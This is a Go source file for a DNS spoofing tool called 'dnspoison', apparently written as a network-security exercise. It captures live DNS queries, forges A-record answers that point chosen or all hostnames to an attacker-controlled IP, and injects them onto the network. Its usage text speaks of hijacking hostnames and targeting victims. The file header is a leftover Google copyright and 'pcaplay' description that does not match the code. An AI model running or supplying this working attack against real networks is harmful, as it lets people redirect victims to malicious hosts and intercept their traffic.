// Copyright 2012 Google, Inc. All rights reserved.
//
// Use of this source code is governed by a BSD-style license
// that can be found in the LICENSE file in the root of the source
// tree.

// The pcaplay binary load an offline capture (pcap file) and replay
// it on the select interface, with an emphasis on packet timing
package main

import (
	"flag"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"io/ioutil"
	"net"
	"os"
	"strings"
)

// go run dnspoison.go [-i interface] [-f hostnames] [expression]
func main() {
	// Parsing command lines
	var ifaceName string
	var hostFile string
	var bpfFilterArr []string
	flag.StringVar(&ifaceName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
	flag.Usage = func() {
		_, _ = fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Println("<expression> is a BPF filter that specifies a subset of the traffic to be monitored, which is useful for targeting a single victim or a group of victims")
	}
	flag.Parse()
	bpfFilterArr = flag.Args()
	if ifaceName == "" { // interface is not specified, set as default device interface
		ifs, _ := pcap.FindAllDevs()
		ifaceName = ifs[0].Name
	}
	fmt.Println("Arguments:", ifaceName, hostFile, strings.Join(bpfFilterArr, " "))

	// opens a device and returns a handle
	handle, err := pcap.OpenLive(ifaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	} else if flag.NArg() != 0 { // set BPFFilter if specified
		if err := handle.SetBPFFilter(strings.Join(bpfFilterArr, " ")); err != nil {
			panic(err)
		}
	}
	defer handle.Close()

	ip := getIfaceAddr(ifaceName)    // get ip addr relates to the specified interface
	ipHosts := readMapping(hostFile) // read ip host mapping from file

	// pre-allocate all the space needed for the layers
	var ethLayer layers.Ethernet
	var ipv4Layer layers.IPv4
	var udpLayer layers.UDP
	var dnsLayer layers.DNS

	var q layers.DNSQuestion

	// create the decoder for fast-packet decoding
	// (using the fast decoder takes about 10% the time of normal decoding)
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)

	// this slick will hold the names of the layers successfully decoded
	decodedLayers := make([]gopacket.LayerType, 0, 4)

	// create a buffer for writing output packet
	outbuf := gopacket.NewSerializeBuffer()

	// set the arguments for serialization
	serialOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// pre-allocate loop counter
	var i uint16

	// swap storage for ip and udp fields
	var ipv4Addr net.IP
	var udpPort layers.UDPPort
	var ethMac net.HardwareAddr

	// Main loop for dns packets intercepted
	// No new allocations after this point to keep garbage collector
	// cyles at a minimum
	for {
		packetData, _, err := handle.ReadPacketData()
		if err != nil {
			break
		}

		// decode this packet using the fast decoder
		err = decoder.DecodeLayers(packetData, &decodedLayers)

		// only proceed if all layers decoded
		if len(decodedLayers) != 4 {
			// fmt.Println("Not enough layers!")
			continue
		}

		// check that this is not a response
		if dnsLayer.QR {
			continue
		}

		// print the question section
		fmt.Println("========== Packet captured! ==========")
		fmt.Println("DNS questions:")
		for i = 0; i < dnsLayer.QDCount; i++ {
			fmt.Println(i, string(dnsLayer.Questions[i].Name))
		}

		// set this to be a response
		dnsLayer.QR = true

		// if recursion was requested, it is available
		if dnsLayer.RD {
			dnsLayer.RA = true
		}

		forge := false
		// for each question
		for i = 0; i < dnsLayer.QDCount; i++ {

			// get the question
			q = dnsLayer.Questions[i]

			// verify this is an A-IN record question
			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
				continue
			}

			var a layers.DNSResourceRecord
			a.Type = layers.DNSTypeA
			a.Class = layers.DNSClassIN
			a.TTL = 300

			// copy the name across to the response
			a.Name = q.Name
			fmt.Println("name of question:", string(q.Name))
			// assign related ip addr
			if ipHosts == nil {
				fmt.Println("set ip as interface's ip addr")
				forge = true
				a.IP = ip // mapping file not specified, forge replies with the chosen interface's IP address
			} else if ipStr, ok := ipHosts[string(q.Name)]; ok {
				fmt.Println("host exists in mapping file")
				forge = true
				a.IP = net.ParseIP(ipStr)
			} else {
				continue // not in mapping, ignore
			}

			// append the answer to the original query packet
			dnsLayer.Answers = append(dnsLayer.Answers, a)
			dnsLayer.ANCount = dnsLayer.ANCount + 1

		}
		// file is specified while host is not contained in file, no need to forge response
		if forge == false {
			fmt.Println("no need to forge response")
			continue
		}

		// swap ethernet macs
		ethMac = ethLayer.SrcMAC
		ethLayer.SrcMAC = ethLayer.DstMAC
		ethLayer.DstMAC = ethMac

		// swap the ip
		ipv4Addr = ipv4Layer.SrcIP
		ipv4Layer.SrcIP = ipv4Layer.DstIP
		ipv4Layer.DstIP = ipv4Addr

		// swap the udp ports
		udpPort = udpLayer.SrcPort
		udpLayer.SrcPort = udpLayer.DstPort
		udpLayer.DstPort = udpPort

		// set the UDP to be checksummed by the IP layer
		err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
		if err != nil {
			panic(err)
		}

		// serialize packets
		err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
		if err != nil {
			panic(err)
		}

		// write packet
		err = handle.WritePacketData(outbuf.Bytes())
		if err != nil {
			panic(err)
		}

		fmt.Println("Response sent")

		// comment out for debugging
		// continue

		// DEBUGGG--------------------------------------------------------------

		err = decoder.DecodeLayers(outbuf.Bytes(), &decodedLayers)
		if err != nil {
			fmt.Println("Decoding error: " + err.Error())
			continue
		}

		// only proceed if all layers decoded
		if len(decodedLayers) != 4 {
			fmt.Println("Not enough layers!")
			for j := range decodedLayers {
				fmt.Println(decodedLayers[j])
			}
			continue
		}

		// print packet
		fmt.Printf("IP src %v\n", ipv4Layer.SrcIP)
		fmt.Printf("IP dst %v\n", ipv4Layer.DstIP)
		fmt.Printf("UDP src port: %v\n", udpLayer.SrcPort)
		fmt.Printf("UDP dst port: %v\n", udpLayer.DstPort)
		fmt.Printf("DNS Quy count: %v\n", dnsLayer.QDCount)
		// print the question section
		for i = 0; i < dnsLayer.QDCount; i++ {
			fmt.Printf("%v\n", string(dnsLayer.Questions[i].Name))
		}
		fmt.Printf("DNS Ans count: %v\n", dnsLayer.ANCount)

		// print the question section
		for i = 0; i < dnsLayer.ANCount; i++ {
			fmt.Printf("%v type %v\n", string(dnsLayer.Answers[i].Name), dnsLayer.Answers[i].Type)
			fmt.Printf("\t%v\n", dnsLayer.Answers[i].IP)
		}

		break

	}

}

func getIfaceAddr(ifaceName string) net.IP {
	ifaces, _ := net.Interfaces()
	for i := range ifaces {
		if ifaces[i].Name == ifaceName {
			addrs, err := ifaces[i].Addrs()
			if err != nil {
				panic(err)
			}

			if len(addrs) == 0 {
				panic("No addr relates to specified interface")
			}

			for _, addr := range addrs {
				ip, _, _ := net.ParseCIDR(addr.String())
				if ip.To4() != nil {
					fmt.Println("ip to interface", ifaceName, ip)
					return ip
				}
			}
		}
	}
	return nil
}

func readMapping(filename string) map[string]string {
	if filename == "" {
		return nil // return an empty map if filename not specified
	}

	ipHost := make(map[string]string)
	data, _ := ioutil.ReadFile(filename)
	lines := strings.Split(string(data), "\n")
	for _, element := range lines {
		line := strings.Fields(element)
		if len(line) == 0 {
			break
		}
		ipHost[line[1]] = line[0]
	}
	fmt.Println(ipHost)
	return ipHost
}
